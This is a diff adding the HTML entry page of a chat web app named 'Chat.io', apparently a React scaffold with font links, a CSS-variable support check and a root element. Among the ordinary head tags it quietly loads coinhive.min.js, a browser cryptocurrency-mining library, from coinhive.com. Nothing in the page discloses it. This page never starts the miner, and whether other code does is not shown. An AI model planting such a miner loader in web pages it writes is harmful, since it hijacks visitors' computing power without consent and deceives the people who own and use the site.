@@ -1,0 +1,39 @@
+<!doctype html>
+<html lang="en" class="no-js">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="theme-color" content="#000000">
+    <link rel="manifest" href="%PUBLIC_URL%/manifest.json">
+    <link rel="shortcut icon" href="%PUBLIC_URL%/favicon.ico">
+    <link href="https://fonts.googleapis.com/css?family=Lato|Libre+Barcode+39+Text|Poppins:300,700,900" rel="stylesheet">
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+      document.documentElement.className = 'js';
+      var supportsCssVars = function () {
+        var s = document.createElement('style'),
+          support;
+
+        s.innerHTML = "root: { --tmp-var: bold; }";
+        document.head.appendChild(s);
+        support = !!(window.CSS && window.CSS.supports && window.CSS.supports('font-weight', 'var(--tmp-var)'));
+        s.parentNode.removeChild(s);
+        return support;
+      }
+      if (!supportsCssVars()) alert('Please view this demo in a modern browser that supports CSS Variables.')
+    </script>
+    <title>Chat.io</title>
+    <script>
+      document.documentElement.className = 'js';
+    </script>
+  </head>
+
+  <body>
+    <noscript>
+      You need to enable JavaScript to run this app.
+    </noscript>
+    <div id="root"></div>
+  </body>
+
+</html>
